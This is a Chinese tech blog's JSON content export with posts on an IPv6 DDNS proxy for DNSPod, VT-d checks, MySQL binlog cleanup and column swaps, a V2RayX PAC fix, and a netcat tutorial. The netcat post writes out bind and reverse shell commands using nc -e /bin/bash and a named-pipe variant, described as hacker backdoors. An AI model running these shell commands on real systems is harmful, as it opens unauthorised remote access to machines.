{"meta":{"title":"湿科技","subtitle":"Dancing With Tech","description":"","author":"Chaos John","url":"https://blog.chaosjohn.com","root":"/"},"pages":[],"posts":[{"title":"IPv4/IPv6 双栈 ddns (DNSPod版)","slug":"ddns-for-dnspod","date":"2020-12-16T11:25:06.000Z","updated":"2020-12-16T16:10:33.714Z","comments":true,"path":"ddns-for-dnspod.html","link":"","permalink":"https://blog.chaosjohn.com/ddns-for-dnspod.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言笔者很早以前就有一个梦想，即：我所有的联网设备，都要能随时随地访问到。比如在公司访问我家里的电脑和 NAS，以及在家里访问公司的工作电脑。 于是笔者开始了漫长的折腾之路： 最开始，家里和公司都是电信宽带，我就不厌其烦地骚扰电信客服，申请公网IP。当路由器分配到了公网IP后，配合 DMZ 和 端口映射，就能将路由器下设备的某些端口暴露在公网上。缺点：如果设备和需要暴露到公网的服务比较多，不拿个记事本把 什么服务暴露在什么端口 记录下来，用到的时候总是会记混淆。 后来搬家后宽带从电信换成了移动，获取公网IP就成了奢望（我还真上过工信部投诉，结果移动致电过来表示可以给我安排停服退款，我怂了，继续用吧）。然后就买了一个花生棒，即花生壳的内网穿透版，因免费版只给两条映射，所以笔者只能贡献给常用机的 SSH(22端口) 和 VNC(5900端口)。缺点：奈何能用的端口只有两个，以及每月只有2G的流量，笔者撑了一段时间还是放弃了它。 后来逐渐接触到各种内网穿透方案，先是 ngork，后来是 frp，将服务端部署在了自己的云主机上后，端口数量限制再也不是问题了，想配多少就配多少。缺点：国内云主机的带宽实在太贵，以阿里云为例，1M带宽23元每月，2M带宽46元，3M带宽71元，4M带宽96元，5M带宽125元，带宽越大单价越贵；国外云主机带宽虽然足，但是延迟太高了，真的很难取舍。 再后来，又接触到了 n2n，个人的云主机上搭建一个节点服务器 supernode，不同设备都连接 supernode，协商后直接进行点对点（P2P）通信，即真正的设备间数据传输是直连的而不经过 supernode。优点：全端口可用，速度不受限。缺点：因为是 P2P 方案，所以需要设备都安装客户端，但它把 Windows / Linux / macOS / Android 都支持遍了，就是没有 iOS 的客户端。 17年下半年的时候，笔者突然发现了神器 ZeroTier。它就是一个增强版的 n2n，不同的是，它默认使用官方的节点服务器（当然个人也可以自建），更为重要的是，几乎所有的系统平台，它都支持，就连各类NAS也能安装使用。笔者直到今天，还在深度使用它。举个例子证明笔者有多爱它：官网是 zerotier.com，笔者于 2018-01-12 在腾讯云注册了域名 zerotier.cn，专门用来解析 ZeroTier 分配给设备的 内网IP，并续费至今。（如果用 whois 查一下该域名，还能发现笔者的真名和邮箱哦哈哈哈哈哈）缺点：在设备点对点之间的线路优化好之前，丢包比较严重，甚至连不上。但只要线路逐渐优化好之后，速度几乎能跑满带宽。 19年下旬的时候，笔者突然发现，家庭宽带和手机蜂窝网络，居然都原生支持 IPv6 了，即无论是路由器下的设备，还是插了SIM卡的移动设备，都能分配到 IPv6地址 了。这意味着，通过某设备的 IPv6 地址，可以直接访问到该设备的所有端口（80/443端口是否被禁得看各地运营商政策）。 IPv6 的问题用 IPv6 实现所有设备的连通，这点非常棒，就只差一个问题需要解决：适用于 IPv6 的 ddns 方案。 什么是 ddns 呢？它的全称为 dynamic dns，即 动态域名解析。 使用场景：家庭宽带下，IP地址 会被运营商定期更换，在自身 IP地址 发生变化后，将新的IP地址提交给 dns解析服务商，让约定的域名解析更新为新的IP地址。 上面 折腾之路[1]，通过电信宽带分配的公网IP访问服务，也是需要用 ddns 来更新 IP地址 到自己的域名上，不过一般路由器都内置了 ddns 功能，傻瓜式配置起来也很简单。 但是： 这些成熟且内置的 ddns 方案，都只适用于 IPv4 对于 IPv4，局域网内只需有一台设备（可以是路由器本身，也可以是下属设备）配置 ddns 就可以了，因为整个局域网都共用一个公网IP；而对于 IPv6，每个设备都有自己的公网IP，即需要公网被访问的每台设备都要单独配置 ddns 解决 IPv6 的 ddns因笔者的域名几乎都是在 腾讯云 上购买的，并且使用 DNSPod 进行解析，故以下所有的方案都是聚焦于 DNSPod。 第一版方案去 DNSPod 开源社区寻找 IPv6-ddns 的解决方案。不得不说，很多工具都写的很棒，代码写的很漂亮，但是都不适用笔者，主要原因为，笔者的设备太多了，所搭载的系统也太杂了，导致那些工具即使为了提高兼容性，采用 纯Python 和 纯Shell 编写，也无法满足所有设备，比如 ESXi，这家伙虽然底层是 Linux，但是魔改了很多，无论是 Shell 还是 Python 环境，都是阉割过的，实测大部分工具都无法正常运行；另一方面，如果遇到多网卡（含虚拟网卡）的场景，那些工具很难获取到准确的且公网可达的本地 IPv6地址。 第二版方案为了解决 第一版方案 的两个痛点： 如何获取到准确的 IPv6 地址 如何能在 几乎 所有系统上都适用（除开Windows，因为笔者几乎不用） 针对 痛点1：既然通过读取网卡信息无法做到准确地获取公网可达的 IPv6地址，那就更换思路，网上不是有很多查询自身 IPv6地址 吗，比如 api6.ipify.org 12$ curl api6.ipify.org240e:47b:1660:4939:881f:1234:5678:9abc 因为几乎所有的系统都预装了 curl 或者 wget（比如 ESXi 无 curl 但内置了阉割版的 wget），所以 痛点1 完美解决。 同时也给解决 痛点2 提供了思路：如果我在自己的云主机上部署一个服务，设备定期将自己的 IPv6地址 和与其绑定的域名通过 curl / wget 提交给该服务，让该服务在云主机上代理进行 ddns，将新解析提交给 DNSPod，不就解决了吗？ 于是笔者： 参考 DNSPod API 用 NodeJS 写了一个 ddns代理 的服务部署在云主机上（用 NodeJS 进行编写的原因仅仅是当时的工作内容和 NodeJS 相关，顺手而已） 各设备上用 cron 或 while + sleep 定时（笔者设定的是1分钟）先从 api6.ipify.org 获取本机 IPv6地址 再向该 ddns代理服务 提交。 Perfect！ 第三版方案第二版 方案用的挺舒心的，但是运行了一段时间发现，出问题了，我好多设备都每分钟请求一次，还挺频繁的，导致 api6.ipify.org 限流，拒绝返回。 换用其他的 IPv6地址查询服务，也都一样，隔一段时间就可能被限流。 所以笔者萌生了自己写一个 IPv6地址查询服务，只为自己提供服务，限不限流我自己说了算！ 这回为了造轮子能造的快点，放弃了 NodeJS 改用了 PHP，直接上代码： PHP 代码 1234$ cat &#x2F;home&#x2F;chaos&#x2F;IPChecker&#x2F;index.php&lt;?phpecho $_SERVER[&#39;REMOTE_ADDR&#39;]; Nginx 配置文件 123456789101112131415$ cat &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;ip-check.confserver &#123; server_name ip.example.com ipv6.example.com; listen 80; listen [::]:80; root &#x2F;home&#x2F;chaos&#x2F;IPChecker; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php; fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; 是不是很简单，PHP 代码就只有一行代码 echo $_SERVER[&#39;REMOTE_ADDR&#39;];，即直接输出请求的来源地址，而且同时支持 IPv4/IPv6： curl ip.example.com 返回 IPv4 公网地址 curl ipv6.example.com 返回 IPv6 公网地址 （注：该服务只能部署在有 IPv6 地址的云主机上，因为 IPv6 只能访问 IPv6） 第四版方案完成一次 ddns，要先从 ipv6.chaosjohn.com 获取 IPv6地址，再向 ddns代理服务 提交，得两步操作，太麻烦了。 所以笔者决定把两项服务合二为一，依旧废话不多说，上代码： 项目根目录 12345678910111213141516$ ls -alh &#x2F;home&#x2F;chaos&#x2F;ddns-dnspodtotal 88Kdrwxrwxr-x 4 chaos chaos 4.0K Nov 3 06:57 .drwxr-xr-x 23 chaos chaos 4.0K Dec 16 15:30 ..-rw-rw-r-- 1 chaos chaos 75 Nov 2 09:24 composer.json-rw-rw-r-- 1 chaos chaos 2.7K Nov 2 09:24 composer.lock-rw-rw-r-- 1 chaos chaos 71 Nov 3 01:46 config.ini-rw-rw-r-- 1 chaos chaos 53 Nov 3 05:54 config-sample.inidrwxrwxr-x 8 chaos chaos 4.0K Nov 3 06:57 .git-rw-rw-r-- 1 chaos chaos 524 Nov 3 05:57 .gitignore-rw-rw-r-- 1 chaos chaos 2.7K Nov 3 02:59 index.php-rw-rw-r-- 1 chaos chaos 35K Nov 3 06:02 LICENSE-rw-r--r-- 1 chaos chaos 358 Nov 2 14:04 nginx.conf-rw-r--r-- 1 chaos chaos 362 Nov 3 05:53 nginx-sample.conf-rw-rw-r-- 1 chaos chaos 941 Nov 3 06:57 README.mddrwxrwxr-x 4 chaos chaos 4.0K Nov 2 09:24 vendor 配置文件（其中 token 是 DNSPod 密钥管理里的 ID,token，形如 30345,ac0000000918368b1cfa16f4fc6e28cd） 1234$ cat &#x2F;home&#x2F;chaos&#x2F;ddns-dnspod&#x2F;config.ini[config]token &#x3D; &#39;YOUR-DNSPOD-TOKEN&#39;key &#x3D; &#39;YOUR-KEY&#39; PHP 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879$ cat &#x2F;home&#x2F;chaos&#x2F;ddns-dnspod&#x2F;index.php&lt;?phprequire __DIR__ . &#39;&#x2F;vendor&#x2F;autoload.php&#39;;use Curl\\Curl;$curl &#x3D; new Curl();$ini_array &#x3D; parse_ini_file(&#39;config.ini&#39;, true);$token &#x3D; $ini_array[&#39;config&#39;][&#39;token&#39;]; &#x2F;&#x2F; dnspod token$required_key &#x3D; $ini_array[&#39;config&#39;][&#39;key&#39;];&#x2F;&#x2F;echo $_SERVER[&#39;HTTP_X_REAL_IP&#39;];$address &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];$isIPv6 &#x3D; strpos($address, &#39;:&#39;) &gt; -1;$type &#x3D; $isIPv6 ? &#39;AAAA&#39; : &#39;A&#39;;$domain &#x3D; $_GET[&#39;domain&#39;];$sub &#x3D; $_GET[&#39;sub&#39;];$key &#x3D; $_GET[&#39;key&#39;];if (!$domain || !$sub || 0 !&#x3D; strcmp($key, $required_key)) exit;$output &#x3D; [ &#39;domain&#39; &#x3D;&gt; $domain, &#39;sub&#39; &#x3D;&gt; $sub, &#39;type&#39; &#x3D;&gt; $type, &#39;address&#39; &#x3D;&gt; $address];$form &#x3D; &quot;login_token&#x3D;$&#123;token&#125;&amp;format&#x3D;json&amp;domain&#x3D;$&#123;domain&#125;&amp;sub_domain&#x3D;$&#123;sub&#125;&amp;record_type&#x3D;$&#123;type&#125;&amp;record_line_id&#x3D;0&quot;;$response &#x3D; $curl-&gt;post(&#39;https:&#x2F;&#x2F;dnsapi.cn&#x2F;Record.List&#39;, $form);if ($curl-&gt;error) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Record.List Error&#39; . $curl-&gt;errorCode . &#39;: &#39; . $curl-&gt;errorMessage . &quot;\\n&quot;;&#125; else &#123; $records &#x3D; $response-&gt;records; if (null &#x3D;&#x3D; $records) $records &#x3D; []; $records &#x3D; array_filter($records, function($record) use($type) &#123; return 0 &#x3D;&#x3D; strcmp($record-&gt;type, $type); &#125;); if (count($records) &gt; 0) &#123; &#x2F;&#x2F; if record exists $record &#x3D; $records[0]; if (0 &#x3D;&#x3D; strcmp($record-&gt;value, $address)) &#123; &#x2F;&#x2F; skip if same $output[&#39;msg&#39;] &#x3D; &#39;Same record. Skipped&#39;; echo json_encode($output); exit; &#125; &#x2F;&#x2F; update record $record_id &#x3D; $record-&gt;id; $form &#x3D; &quot;login_token&#x3D;$&#123;token&#125;&amp;format&#x3D;json&amp;domain&#x3D;$&#123;domain&#125;&amp;record_id&#x3D;$&#123;record_id&#125;&amp;sub_domain&#x3D;$&#123;sub&#125;&amp;value&#x3D;$&#123;address&#125;&amp;record_type&#x3D;$&#123;type&#125;&amp;record_line_id&#x3D;0&quot;; $response &#x3D; $curl-&gt;post(&#39;https:&#x2F;&#x2F;dnsapi.cn&#x2F;Record.Modify&#39;, $form); if ($curl-&gt;error) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Record.Modify Error&#39; . $curl-&gt;errorCode . &#39;: &#39; . $curl-&gt;errorMessage . &quot;\\n&quot;; &#125; else &#123; if (null !&#x3D; $response-&gt;status &amp;&amp; null !&#x3D; $response-&gt;status-&gt;code &amp;&amp; &#39;1&#39; &#x3D;&#x3D; $response-&gt;status-&gt;code) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Modification succeeded&#39;; &#125; else &#123; $output &#x3D; $response; $output-&gt;action &#x3D; &#39;Record.Modify&#39;; &#125; &#125; &#125; else &#123; &#x2F;&#x2F; record not exists &#x3D;&gt; create $form &#x3D; &quot;login_token&#x3D;$&#123;token&#125;&amp;format&#x3D;json&amp;domain&#x3D;$&#123;domain&#125;&amp;sub_domain&#x3D;$&#123;sub&#125;&amp;record_type&#x3D;$&#123;type&#125;&amp;record_line_id&#x3D;0&amp;value&#x3D;$&#123;address&#125;&quot;; $response &#x3D; $curl-&gt;post(&#39;https:&#x2F;&#x2F;dnsapi.cn&#x2F;Record.Create&#39;, $form); if ($curl-&gt;error) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Record.Create Error&#39; . $curl-&gt;errorCode . &#39;: &#39; . $curl-&gt;errorMessage . &quot;\\n&quot;; &#125; else &#123; if (null !&#x3D; $response-&gt;status &amp;&amp; null !&#x3D; $response-&gt;status-&gt;code &amp;&amp; &#39;1&#39; &#x3D;&#x3D; $response-&gt;status-&gt;code) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Creation succeeded&#39;; &#125; else &#123; $output &#x3D; $response; $output-&gt;action &#x3D; &#39;Record.Create&#39;; &#125; &#125; &#125;&#125;echo json_encode($output, JSON_UNESCAPED_UNICODE); Nginx 配置文件 123456789101112131415$ cat &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;ddns-dnspod.confserver &#123; server_name ddns.example.com ddns6.example.com; listen 80; listen [::]:80; root &#x2F;home&#x2F;chaos&#x2F;ddns-dnspod; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php; fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; 具体使用： 有 cron 的话，在 crontab 里添加一行：1* * * * * logfile&#x3D;&#39;&#x2F;tmp&#x2F;ddns6.log&#39;; echo &quot;\\n$(date)&quot; &gt;&gt; $logfile &amp;&amp; curl &#39;http:&#x2F;&#x2F;ddns6.example.com?key&#x3D;YOUR-KEY&amp;domain&#x3D;DOMAIN&amp;sub&#x3D;SUBDOMAIN&#39; &gt;&gt; $logfile 无 cron 的话，使用 while + sleep1while true; do logfile&#x3D;&#39;&#x2F;tmp&#x2F;ddns6.log&#39;; echo &quot;\\n$(date)&quot; &gt;&gt; $logfile &amp;&amp; curl &#39;http:&#x2F;&#x2F;ddns6.example.com?key&#x3D;YOUR-KEY&amp;domain&#x3D;DOMAIN&amp;sub&#x3D;SUBDOMAIN&#39; &gt;&gt; $logfile; sleep 1; done 如果没有 curl，只有 wget 的话，将 curl [url] 替换为 wget -q -O - [url] 代码笔者已经上传到 Github，如何部署请移步 ChaosJohn/ddns-dnspod 参考哈（喜欢的话给个 Star 呗） 最后所有联网设备都可随时随地访问 这个梦想最终通过 IPv6 完美达成了。 期间经历了多个方案，终于在 折腾之路 上告一段落了。 如果后期有更优解，笔者还会回来的！","categories":[],"tags":[{"name":"ddns","slug":"ddns","permalink":"https://blog.chaosjohn.com/tags/ddns/"}]},{"title":"Linux 下检查 VT-d / IOMMU 是否开启","slug":"Check-VT-D-or-IOMMU-under-Linux","date":"2020-12-15T12:43:47.000Z","updated":"2020-12-15T15:23:07.356Z","comments":true,"path":"Check-VT-D-or-IOMMU-under-Linux.html","link":"","permalink":"https://blog.chaosjohn.com/Check-VT-D-or-IOMMU-under-Linux.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 介绍VT-d 和 IOMMU 其实都是指的 I/O 虚拟化，只不过前者是 Intel 的叫法，后者是 AMD 的叫法： VT-d 全称为 Intel® Virtualization Technology for Directed I/O IOMMU 全称为 Input/Output Memory Management Unit 这项技术是可以让PCI-e设备的资源直接分配给虚拟机，即 PCI直通。 举个例子，在虚拟客户机里可以直接访问到物理显卡，性能比使用由 VMM/Hypervisor 虚拟出来的显卡好很多，并且还支持 显卡加速。 在 Linux 下检查是否开启一般来说，在主板的 BIOS/UEFI 里，能找到 VT-d / IOMMU 的设置项，设为开启即可。 但是也有特殊情况，某些主板里是找不到该项设置的，这里分两种情况： 主板硬件或固件不支持 I/O 虚拟化 主板刷入了阉割版的固件，但是实际上 VT-d / IOMMU 是被启用的 那如果在 Linux 下如何检查是否开启呢？ 如果 VT-d / IOMMU 被启用，Linux 在启动过程中会配置 DMA重映射，所以简单的方法是在 dmesg 里查找 DMAR 相关项。 在已开启的机子上： 12345678910111213# dmesg | grep DMAR[ 0.000000] ACPI: DMAR 0x00000000BBECB000 0000A8 (v01 LENOVO TP-R0D 00000930 PTEC 00000002)[ 0.001000] DMAR: Host address width 39[ 0.001000] DMAR: DRHD base: 0x000000fed90000 flags: 0x0[ 0.001000] DMAR: dmar0: reg_base_addr fed90000 ver 1:0 cap 1c0000c40660462 ecap 19e2ff0505e[ 0.001000] DMAR: DRHD base: 0x000000fed91000 flags: 0x1[ 0.001000] DMAR: dmar1: reg_base_addr fed91000 ver 1:0 cap d2008c40660462 ecap f050da[ 0.001000] DMAR: RMRR base: 0x000000bbdd8000 end: 0x000000bbdf7fff[ 0.001000] DMAR: RMRR base: 0x000000bd000000 end: 0x000000bf7fffff[ 0.001000] DMAR-IR: IOAPIC id 2 under DRHD base 0xfed91000 IOMMU 1[ 0.001000] DMAR-IR: HPET id 0 under DRHD base 0xfed91000[ 0.001000] DMAR-IR: Queued invalidation will be enabled to support x2apic and Intr-remapping.[ 0.002000] DMAR-IR: Enabled IRQ remapping in x2apic mode 观察最后一行，可以看到类似 DMAR-IR: Enabled IRQ remapping in xxxxx mode 的输出 在未开启的机子上： 12# dmesg | grep DMAR# 什么输出都没有，即没有找到任何与 DMAR 相关的项 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[]},{"title":"删除/清理 MySQL 的 binlog","slug":"Delete-binlog-in-MySQL","date":"2020-12-14T08:43:16.000Z","updated":"2020-12-14T11:37:49.404Z","comments":true,"path":"Delete-binlog-in-MySQL.html","link":"","permalink":"https://blog.chaosjohn.com/Delete-binlog-in-MySQL.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 背景今年年中的时候，我司和腾讯达成了一项深度合作，涉及到的数据量还挺大的。果不其然，谈下合作后负责实施的还是我这个“什么都干司令”。 具体流程： 从我司已有产品中，筛出一部分数据 数据清理 处理成通用格式（因为老板说后续不仅仅只跟腾讯合作） 输出给腾讯（实时处理成腾讯方需要的格式）并且记录输出时间在本地 因为数据清理+处理比较费时间和空间，所以本地临时搞了一台高性能台式机作为服务器（是的，本“什么都干司令”还负责组装电脑），配置： CPU: AMD Ryzen 5 3600 MEM: 32GB SSD: 1TB 问题还处在数据清理和处理的流程中，突然发现程序脚本异常退出了。 通过排查发现，1TB的磁盘，居然满了，定位到 /var/lib/mysql 路径下，发现了大量的 binlog.xxxxxxx 文件，通过 ncdu 分析出它们占据了大几百GB的磁盘空间。 （当时处理问题之前没有截图，所以只能截几张写本文时的图了，而写本文时，合作已经处于最后的输出流程了，所以数据库 写操作 只与 记录输出时间 相关，数据量小了很多） 原因binlog 是记录所有数据库表结构变更（例如CREATE、ALTER TABLE…）以及表数据修改（INSERT、UPDATE、DELETE…）的二进制日志。 binlog 不会记录SELECT和SHOW这类操作，因为这类操作对数据本身并没有修改，但你可以通过查询通用日志来查看MySQL执行过的所有语句。 二进制日志包括两类文件：二进制日志索引文件（文件名后缀为 .index）用于记录所有的二进制文件，二进制日志文件（文件名后缀为 .00000*）记录数据库所有的DDL和DML(除了数据查询语句)语句事件。 所以简单点描述，数据库 写操作 越多越频繁，binlog 记录的越多，甚至出现笔者遇到的 爆炸增长。 解决既然 binlog 是日志，只要确保（或者“假装确保”）过去的操作都正确，咱也没有 从 binlog 恢复数据 的需求，那就删了呗。 手动删除直接在 /var/lib/mysql 路径下，将 binlog.0* 删除掉（注意不要删除 binlog.index） 该方法不推荐，因为手动删除并不会更新 binlog.index，而 binlog.index 的作用是加快查找 binlog 文件的速度。 删除指定编号之前的 binlog12mysql&gt; PURGE MASTER LOGS TO &#39;binlog.000860&#39;;Query OK, 0 rows affected (0.01 sec) 删除指定日期之前的 binlog12mysql&gt; PURGE MASTER LOGS BEFORE &#39;2020-11-11 11:11:11&#39;;Query OK, 0 rows affected (0.19 sec) 清空所有 binlog12mysql&gt; RESET MASTER;Query OK, 0 rows affected (0.09 sec) 配置自动清理1mysql&gt; set global expire_logs_days&#x3D;7; 则只保留7天内的 binlog 文件。 或者修改 MySQL 配置文件，设置 expire_logs_days=7 然后重启服务，即可永久生效。 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.chaosjohn.com/tags/MySQL/"}]},{"title":"MySQL 交换两列值","slug":"Swap-column-values-in-MySQL","date":"2020-12-13T12:16:41.000Z","updated":"2020-12-13T13:24:19.362Z","comments":true,"path":"Swap-column-values-in-MySQL.html","link":"","permalink":"https://blog.chaosjohn.com/Swap-column-values-in-MySQL.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言今年五月下旬的时候，公司某线上数据库遭遇表被删事件，对，没错，就是那种 删库 事件。 不过不是恶意删库事件，是某开发童鞋的不小心，而且他也没有跑路。 在发现表被删的第一时间，我就插手处理（假设表名为 sample）： 先把被删的表结构重建起来，先争取线上相关业务接口不再报 502 错误 再从阿里云那边下载当日早些时候的完整数据库备份 创建本地 MySQL 环境，将被删表从完整备份中恢复到本地 等到业务高峰过去后，短暂下线 sample 表相关的服务，即 服务降级 将线上 sample 表的数据导出到 CSV 文件（包含了从删库后重建表开始到服务降级之间的所有数据） 从 CSV 中合并增量数据到本地 sample 表（追加在尾部） 将线上 sample 表备份后删除，将本地 sample 表复制到线上 恢复服务 完美收工！！！ 只不过第二天做投放的小伙伴告诉我，后台数据有错乱。我一检查，发现上述的 步骤6 出了纰漏。合并增量数据的时候，CSV 的列与 sample 表的列没对齐，即有两列交换了位置。 解决所以，解决目标就是，对于数据表里出问题的行，要将该两列交换回来。 方案一利用临时变量 temp，适用场景：x 与 y 必须都不为 NULL 1UPDATE sample SET x&#x3D;y, y&#x3D;@temp WHERE (@temp:&#x3D;x) IS NOT NULL; 方案二（笔者选用的方案）同样利用临时变量 temp，但是 x 与 y 没有不为 NULL 的限制 1UPDATE sample SET x&#x3D;(@temp:&#x3D;x), x&#x3D;y, y&#x3D;@temp; 方案三s1 得到更新，而 s2 则用来拉取老数据（注：该方案要求表必须有主键id） 1UPDATE sample s1, sample s2 SET s1.x&#x3D;s1.y, s1.y&#x3D;s2.x WHERE s1.id&#x3D;s2.id; 方案四（如果 x 与 y 都是数值型）1UPDATE sample SET x&#x3D;x+y,y&#x3D;x-y,x&#x3D;x-y; 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.chaosjohn.com/tags/MySQL/"}]},{"title":"修复 V2RayX 的 PAC 模式失效","slug":"Fix-PAC-mode-of-V2RayX-not-working","date":"2020-12-12T16:41:13.000Z","updated":"2020-12-13T13:20:22.184Z","comments":true,"path":"Fix-PAC-mode-of-V2RayX-not-working.html","link":"","permalink":"https://blog.chaosjohn.com/Fix-PAC-mode-of-V2RayX-not-working.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 问题起因笔者在N年前就开始拿 5had0w50ck5X(-NG) 用以查资料，所以习惯了用 1080 作为本地 socks5 代理的端口号。 因为某些不可抗力因素，笔者不得不放弃该软件，转而投降 V2RayX 的怀抱。 真的挺好用的，除开它的 PAC Mode 不起作用这一点。 具体表现为，在 Safari 里国内网站能正常打开，但是受限网站访问不了。 排查问题先上软件设置页的截图： 因为 Global Mode 是好使的，所以 v2ray-core 是没有问题的，那问题肯定出在 PAC Mode 本身。 点击 Edit pac file 会自动打开 Finder 并定位到 $HOME/Library/Application Support/V2RayX/pac 目录，该目录下只有一个文件 pac.js 先检查一下 pac.js 的内容 12345678910111213141516var V2Ray &#x3D; &quot;SOCKS5 127.0.0.1:1081; SOCKS 127.0.0.1:1081; DIRECT;&quot;;var domains &#x3D; [ ... ... ...];function FindProxyForURL(url, host) &#123; for (var i &#x3D; domains.length - 1; i &gt;&#x3D; 0; i--) &#123; if (dnsDomainIs(host, domains[i])) &#123; return V2Ray; &#125; &#125; return &quot;DIRECT&quot;;&#125; domains 里存放的是需要走 代理 的域名，着重检查了几个，都在其中，所以排除了 域名列表失效 的因素。 突然我一拍脑袋的发现： 我在 GUI设置 里配置的本地 Socks5 Port 为 1080 pac.js 里第一行，配置的端口却为 1081 这。。。要是能走通代理就奇了怪了！！！ 把 pac.js 里的 1081 改为 1080，PAC Mode 就立刻正常工作了。 写在最后平时发现问题之后，除了去网上查解决办法，可以先自己检查一下设置，自行排查一下原因，不仅能获得成就感，还能锻炼思维能力。 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"proxy","slug":"proxy","permalink":"https://blog.chaosjohn.com/tags/proxy/"},{"name":"v2ray","slug":"v2ray","permalink":"https://blog.chaosjohn.com/tags/v2ray/"},{"name":"PAC","slug":"PAC","permalink":"https://blog.chaosjohn.com/tags/PAC/"}]},{"title":"TCP/IP 瑞士军刀 - netcat (篇二)","slug":"TCP-IP-Swiss-Army-Knife-netcat-2","date":"2020-12-11T11:19:36.000Z","updated":"2020-12-11T17:16:33.203Z","comments":true,"path":"TCP-IP-Swiss-Army-Knife-netcat-2.html","link":"","permalink":"https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言昨日写 TCP/IP 瑞士军刀 - netcat (篇一) 的时候，翻阅了大量的资料，浏览器的标签也都开满了。所以趁大脑还依旧活跃，今天乘胜追击写个 篇二，仍然是以 GIF 动图演示其案例。 补上篇上篇里有提到，如果只用 netcat 进行端口转发，必须用到 GNU 版本（因其拥有 -c / -e 参数）： -c shell commands 调用 /bin/sh 来执行命令 -e filename 通过程序文件路径来执行程序 上案例： 远端执行 nc -l -k -p 8080 -c &quot;nc 192.168.1.21 22&quot;，即可将 8080 端口转发到 192.168.1.21:22 本地执行 ssh 10.144.137.114 -p 8080 即可测试转发成功 反弹 Shellnetcat 在网络应用中，很受黑客的喜爱，反弹 Shell 是其经常使用的场景。 什么是 反弹 Shell 呢？给个一句话解释：在目标机器上，弹一个 Shell 出来作为其后门，与本地机器进行通信，即 本地机器 可直接访问 目标机器 的 Shell。 而 反弹 Shell 也分为两种： 正向 Shell，又名 bind shell 反向 Shell，又名 reverse shell 因为要弹个 Shell 出来，所以一般都需要访问到 Shell，/bin/sh 或 /bin/bash 或 /bin/zsh 都可以。既然用到外部 Shell 程序，那一般都是使用 GNU 版本的 netcat（用到其 -c / -e 参数） 正向 Shell先弹后连接，即让 目标机器 先弹个 Shell，暴露在某端口，然后 本地机器 连接上 目标机器 该端口，即可访问目标机器的 Shell。 目标机器：nc -l -p 8080 -e /bin/bash 本地机器：nc 10.144.137.114 8080 反向 Shell先监听后连接，即 本地机器 先监听 目标机器 的某端口，如果 目标机器 在该端口弹出了 Shell，就可立即连接上。 本地机器：nc -v -l -p 8080 目标机器：nc 10.144.247.172 8080 -e /bin/bash OpenBSD netcat 实现正向 Shell那如果非要用 OpenBSD 版本的 netcat，搭配什么使用可以反弹 Shell 呢？这里笔者列举一个列子 - 命名管道（named pipe），又名 FIFO，即 first in first out 先进先出。 目标机器先执行：mkfifo /tmp/pipe 创建一个命名管道 目标机器再执行：cat /tmp/pipe | /bin/bash 2&gt;&amp;1 | nc -l -p 8080 &gt; /tmp/pipe 进行反弹 Shell 本地机器执行：nc 192.168.1.21 8080 命名管道 的 stdout（标准输出） 通过 &quot;|&quot; 流向 bash 2&gt;&amp;1 表示 bash 的 stderr（标准错误） 重定向到 stdout（标准输出） bash 的 stdout（标准输出） 通过 &quot;|&quot; 流向 目标机器的 nc 进而通过 TCP/UDP 连接 流向 本地机器的 nc 并显示 本地机器 输入的命令再通过 本地机器的 nc 流向 目标机器的 nc 目标机器的 nc 将接收到的命令输入 命名管道 至此形成一个完整的循环 写在最后本文演示了用 netcat 实现 端口转发 和 反弹 Shell，还有很多案例，等待读者们去发掘！ 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://blog.chaosjohn.com/tags/TCP-IP/"},{"name":"netcat","slug":"netcat","permalink":"https://blog.chaosjohn.com/tags/netcat/"}]},{"title":"TCP/IP 瑞士军刀 - netcat (篇一)","slug":"TCP-IP-Swiss-Army-Knife-netcat-1","date":"2020-12-10T07:53:50.000Z","updated":"2020-12-10T12:35:08.791Z","comments":true,"path":"TCP-IP-Swiss-Army-Knife-netcat-1.html","link":"","permalink":"https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言本来打算写 端口转发(篇三) - netcat 但是中途发现 netcat 